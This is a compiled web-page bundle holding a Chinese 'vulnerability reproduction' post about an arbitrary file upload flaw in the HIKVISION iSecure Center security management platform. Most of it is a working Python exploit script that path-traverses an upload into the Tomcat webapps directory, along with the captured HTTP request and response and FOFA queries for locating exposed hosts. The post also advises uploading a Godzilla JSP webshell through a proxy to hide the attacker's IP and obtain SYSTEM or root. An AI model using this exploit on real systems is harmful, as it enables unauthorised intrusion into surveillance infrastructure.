"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[1991],{3905:(e,t,n)=>{n.d(t,{Zo:()=>s,kt:()=>d});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},s=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},f=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,p=e.parentName,s=c(e,["components","mdxType","originalType","parentName"]),u=l(n),f=a,d=u["".concat(p,".").concat(f)]||u[f]||m[f]||i;return n?r.createElement(d,o(o({ref:t},s),{},{components:n})):r.createElement(d,o({ref:t},s))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=f;var c={};for(var p in t)hasOwnProperty.call(t,p)&&(c[p]=t[p]);c.originalType=e,c[u]="string"==typeof e?e:a,o[1]=c;for(var l=2;l<i;l++)o[l]=n[l];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}f.displayName="MDXCreateElement"},6889:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>o,default:()=>m,frontMatter:()=>i,metadata:()=>c,toc:()=>l});var r=n(7462),a=(n(7294),n(3905));const i={},o=void 0,c={unversionedId:"\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",id:"\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",title:"\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",description:"\u5b66\u4e60\u6587\u7ae0\uff1a",source:"@site/docs/\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e.md",sourceDirName:"\u6f0f\u6d1e\u590d\u73b0",slug:"/\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",draft:!1,editUrl:"https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/\u6f0f\u6d1e\u590d\u73b0/\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"\u6c38\u6052\u4e4b\u84dd",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/\u6c38\u6052\u4e4b\u84dd"},next:{title:"\u7528\u53cb-NC-Cloud\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/\u7528\u53cb-NC-Cloud\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"}},p={},l=[],s={toc:l},u="wrapper";function m(e){let{components:t,...n}=e;return(0,a.kt)(u,(0,r.Z)({},s,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"\u5b66\u4e60\u6587\u7ae0\uff1a\n",(0,a.kt)("a",{parentName:"p",href:"https://zhuanlan.zhihu.com/p/639514473"},"\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"),"\n",(0,a.kt)("a",{parentName:"p",href:"https://github.com/Sweelg/HIKVISION_iSecure_Center-RCE"},"GitHub - Sweelg/HIKVISION_iSecure_Center-RCE: HIKVISION iSecure Center RCE \u6d77\u5eb7\u5a01\u89c6\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 POC&EXP\uff08\u4e00\u952egetshell\uff09")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u7b80\u4ecb")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/yRIeoq5tMcbiNz6.png",alt:null}),"\nHIKVISION iSecure Center\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u662f\u4e00\u5957\u201c\u96c6\u6210\u5316\u201d\u3001\u201c\u667a\u80fd\u5316\u201d\u7684\u5e73\u53f0\uff0c\u901a\u8fc7\u63a5\u5165\u89c6\u9891\u76d1\u63a7\u3001\u4e00\u5361\u901a\u3001\u505c\u8f66\u573a\u3001\u62a5\u8b66\u68c0\u6d4b\u7b49\u7cfb\u7edf\u7684\u8bbe\u5907\uff0c\u83b7\u53d6\u8fb9\u7f18\u8282\u70b9\u6570\u636e\uff0c\u5b9e\u73b0\u5b89\u9632\u4fe1\u606f\u5316\u96c6\u6210\u4e0e\u8054\u52a8\uff0c\u4ee5\u7535\u5b50\u5730\u56fe\u4e3a\u8f7d\u4f53\uff0c\u878d\u5408\u5404\u7cfb\u7edf\u80fd\u529b\u5b9e\u73b0\u4e30\u5bcc\u7684\u667a\u80fd\u5e94\u7528\u3002HIKVISION iSecure Center\u5e73\u53f0\u57fa\u4e8e\u201c\u7edf\u4e00\u8f6f\u4ef6\u6280\u672f\u67b6\u6784\u201d\u5148\u8fdb\u7406\u5ff5\u8bbe\u8ba1\uff0c\u91c7\u7528\u4e1a\u52a1\u7ec4\u4ef6\u5316\u6280\u672f\uff0c\u6ee1\u8db3\u5e73\u53f0\u5728\u4e1a\u52a1\u4e0a\u7684\u5f39\u6027\u6269\u5c55\u3002\u8be5\u5e73\u53f0\u9002\u7528\u4e8e\u5168\u884c\u4e1a\u901a\u7528\u7efc\u5408\u5b89\u9632\u4e1a\u52a1\uff0c\u5bf9\u5404\u7cfb\u7edf\u8d44\u6e90\u8fdb\u884c\u4e86\u6574\u5408\u548c\u96c6\u4e2d\u7ba1\u7406\uff0c\u5b9e\u73b0\u7edf\u4e00\u90e8\u7f72\u3001\u7edf\u4e00\u914d\u7f6e\u3001\u7edf\u4e00\u7ba1\u7406\u548c\u7edf\u4e00\u8c03\u5ea6\u3002"),(0,a.kt)("p",null,"2.\u6f0f\u6d1e\u63cf\u8ff0"),(0,a.kt)("p",null,"HIKVISION iSecure Center\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u662f\u4e00\u5957\u201c\u96c6\u6210\u5316\u201d\u3001\u201c\u667a\u80fd\u5316\u201d\u7684\u5e73\u53f0\uff0c\u901a\u8fc7\u63a5\u5165\u89c6\u9891\u76d1\u63a7\u3001\u4e00\u5361\u901a\u3001\u505c\u8f66\u573a\u3001\u62a5\u8b66\u68c0\u6d4b\u7b49\u7cfb\u7edf\u7684\u8bbe\u5907\uff0c\u83b7\u53d6\u8fb9\u7f18\u8282\u70b9\u6570\u636e\uff0c\u5b9e\u73b0\u5b89\u9632\u4fe1\u606f\u5316\u96c6\u6210\u4e0e\u8054\u52a8\uff0c\u4ee5\u7535\u5b50\u5730\u56fe\u4e3a\u8f7d\u4f53\uff0c\u878d\u5408\u5404\u7cfb\u7edf\u80fd\u529b\u5b9e\u73b0\u4e30\u5bcc\u7684\u667a\u80fd\u5e94\u7528\u3002HIKVISION iSecure Center\u5e73\u53f0\u57fa\u4e8e\u201c\u7edf\u4e00\u8f6f\u4ef6\u6280\u672f\u67b6\u6784\u201d\u5148\u8fdb\u7406\u5ff5\u8bbe\u8ba1\uff0c\u91c7\u7528\u4e1a\u52a1\u7ec4\u4ef6\u5316\u6280\u672f\uff0c\u6ee1\u8db3\u5e73\u53f0\u5728\u4e1a\u52a1\u4e0a\u7684\u5f39\u6027\u6269\u5c55\u3002\u8be5\u5e73\u53f0\u9002\u7528\u4e8e\u5168\u884c\u4e1a\u901a\u7528\u7efc\u5408\u5b89\u9632\u4e1a\u52a1\uff0c\u5bf9\u5404\u7cfb\u7edf\u8d44\u6e90\u8fdb\u884c\u4e86\u6574\u5408\u548c\u96c6\u4e2d\u7ba1\u7406\uff0c\u5b9e\u73b0\u7edf\u4e00\u90e8\u7f72\u3001\u7edf\u4e00\u914d\u7f6e\u3001\u7edf\u4e00\u7ba1\u7406\u548c\u7edf\u4e00\u8c03\u5ea6\u3002\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"),(0,a.kt)("p",null,"3.\u5f71\u54cd\u7248\u672c\nHIKVISION iSecure Center\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0,\u5728\u91ce\u3002"),(0,a.kt)("p",null,"4.fofa\u67e5\u8be2\u8bed\u53e5"),(0,a.kt)("p",null,'icon_hash="-808437027"\napp="HIKVISION-iSecure-Center"'),(0,a.kt)("p",null,"5.\u6f0f\u6d1e\u590d\u73b0\nEXP/POC\uff1avuln37.py"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"#!usr/bin/env python\n# *-* coding:utf-8 *-*\nimport sys\nimport requests\nimport string\nimport random\nimport urllib3\nurllib3.disable_warnings()\n\nproxies = {\n    'http': 'http://127.0.0.1:8080',\n    'https': 'http://127.0.0.1:8080',\n}\n\ndef run(arg):\n    try:\n        flag=''.join(random.choices(string.ascii_uppercase + string.digits, k = 9))\n        filename=''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))\n        vuln_url=arg+\"center/api/files;.js\"\n        headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',\n                 'Accept': '*/*',\n                 'Content-Type': 'application/x-www-form-urlencoded'}\n        file = {'file': (f'../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')}\n        r = requests.post(vuln_url, files=file, timeout=15, verify=False, proxies=proxies)\n        if r.status_code==200 and \"webapps/clusterMgr\" in r.text:\n\n            payload=f\"clusterMgr/{filename}.txt;.js\"\n            url=arg+payload\n            r2 = requests.get(url, timeout=15, verify=False, proxies=proxies)\n            if r2.status_code==200 and flag in r2.text:\n\n                print('\\033[1;31;40m')\n                print(arg+f\":\u5b58\u5728\u6d77\u5eb7\u5a01\u89c6isecure center \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\\nshell\u5730\u5740\uff1a{url}\")\n                print('\\033[0m')\n\n\n\n        else:\n            print(arg+\":\u4e0d\u5b58\u5728\u6f0f\u6d1e\")\n    except:\n        print(arg+\":\u4e0d\u5b58\u5728\u6f0f\u6d1e\")\n\n\nif __name__ == '__main__':\n    url=sys.argv[1]\n    run(url)\n\n")),(0,a.kt)("p",null,"python3 \u6267\u884c\u8fdb\u884c\u68c0\u6d4b\u811a\u672c\u3002\nPS C:\\Users\\asda\\Desktop>  python .\\vuln37.py ",(0,a.kt)("a",{parentName:"p",href:"https://103.152.86.211/"},"https://x.x.x.x/")),(0,a.kt)("p",null,"burpsuit 127.0.0.1:8080\u6293\u5305\uff0c\u6293\u53d6post \u5305\u4e00\u4e2a\uff0cget \u8bf7\u6c42\u5305\u4e00\u4e2a\u3002\npayload\uff1a\u8bf7\u6c42\u6570\u636e\u5305"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},'POST /center/api/files;.js HTTP/1.1\nHost: x.x.x.x\nUser-Agent: python-requests/2.31.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Length: 258\nContent-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4\n\n--e54e7e5834c8c50e92189959fe7227a4\nContent-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt"\nContent-Type: application/octet-stream\n\n9YPQ3I3ZS\n--e54e7e5834c8c50e92189959fe7227a4--\n\n')),(0,a.kt)("p",null,"payload\u7684\u8fd4\u56de\u6570\u636e\u5305\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},'HTTP/1.1 200 \nServer: openresty/1.13.6.2\nDate: Fri, 14 Jul 2023 04:35:23 GMT\nContent-Type: application/json;charset=UTF-8\nContent-Length: 335\nConnection: close\nSet-Cookie: JSESSIONID=0A235873FB1C02C345345C0D36A4C709; Path=/center; HttpOnly\nContent-Language: en_US\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\nContent-Disposition: inline;filename=f.txt\n\n{"code":"0","data":{"filename":"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt","link":"http://10.201.0.18:8001/download1/center_faq/resource/985c3cfb-6820-4318-907a-bf82c5a8ef49/../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt","id":"985c3cfb-6820-4318-907a-bf82c5a8ef49"},"msg":""}\n\n')),(0,a.kt)("p",null,"\u8bbf\u95ee\u6f0f\u6d1e\u94fe\u63a5\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://x.x.x.x/clusterMgr/2BT5AV96QW.txt;.js"},"https://x.x.x.x/clusterMgr/2BT5AV96QW.txt;.js")," \uff0c\u67e5\u770b\u662f\u5426\u4e0a\u4f20\u6210\u529f\u3002"),(0,a.kt)("p",null,"\u56e0\u4e3aHikvision\u5e73\u53f0\u4f7f\u7528\u7684\u4e2d\u95f4\u4ef6\u4e3atomcat\uff0c\u4fee\u6539\u62a5\u6587\u548c\u6587\u4ef6\u540d\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e0a\u4f20\u54e5\u65af\u62c9\u751f\u6210jsp\u540e\u95e8\u6587\u4ef6\u52a0\u5bc6\u65b9\u5f0f\u4e3abase64\u3002\n\u54e5\u65af\u62c9\u8fde\u63a5\u8fc7\u7a0b\u4e2d\u4f7f\u7528clash\u7684socket5 \u96a7\u9053\u4ee3\u7406,\u5b9e\u73b0\u9690\u85cfIP\u5730\u5740\uff0c\u6216\u8005clash \u5f00\u542fTUN\u6a21\u5f0f\u5b9e\u73b0\u5168\u5c40\u4ee3\u7406\u3002"),(0,a.kt)("p",null,"\u5bbf\u4e3b\u670d\u52a1\u5668windows\u548clinux\u90fd\u53ef\u4f7f\u7528\u3002windows \u62ff\u5230\u7684\u8d26\u6237\u662fsystem\u8d26\u6237\uff0clinux\u4e3aroot\u3002\n\u7834\u89e3Hikvison\u8d26\u6237\u7ba1\u7406\u5bc6\u7801\u7684\u540e\u6e17\u900f\u64cd\u4f5c\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://wafinfo.github.io/2023/06/29/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"},"\u6d77\u5eb7\u5a01\u89c6\u7efc\u5408\u5b89\u9632\u540e\u6e17\u900f\u5229\u7528\u6280\u5de7")),(0,a.kt)("p",null,"6.\u4fee\u590d\u63aa\u65bd\n\u8054\u7cfbHikvision\u5382\u5546\uff0c\u66f4\u65b0\u7248\u672c\u3002"))}m.isMDXComponent=!0}}]);